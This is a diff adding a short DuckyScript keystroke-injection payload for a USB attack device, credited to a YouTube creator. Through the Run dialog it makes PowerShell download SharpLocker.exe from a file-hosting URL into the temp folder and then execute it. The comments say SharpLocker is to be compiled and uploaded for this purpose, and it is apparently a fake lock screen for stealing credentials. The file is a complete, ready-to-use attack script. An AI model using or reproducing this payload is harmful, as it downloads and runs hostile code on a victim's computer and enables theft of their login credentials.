@@ -1,0 +1,15 @@
+REM ====> COURTESY OF SEYTONIC <====
+REM ====> https://www.youtube.com/watch?v=JYi_H9n5xjw <====
+REM ====> Executes Sharplock <====
+REM ====> Instructions: Get Sharplock from Github, compile it in VisualStudio and upload .exe to anonfile.com <====
+
+DELAY 4000
+GUI r
+DELAY 150
+STRING powershell (new-object System.Net.WebClient).DownloadFile('https://cdn-35.anonfiles.com/V7XegdZ0o1/16e0b046-1601127563/SharpLocker.exe','%TEMP%\f.exe');
+ENTER
+Delay 400
+GUI r
+DELAY 150
+STRING %TEMP%\f.exe
+ENTER
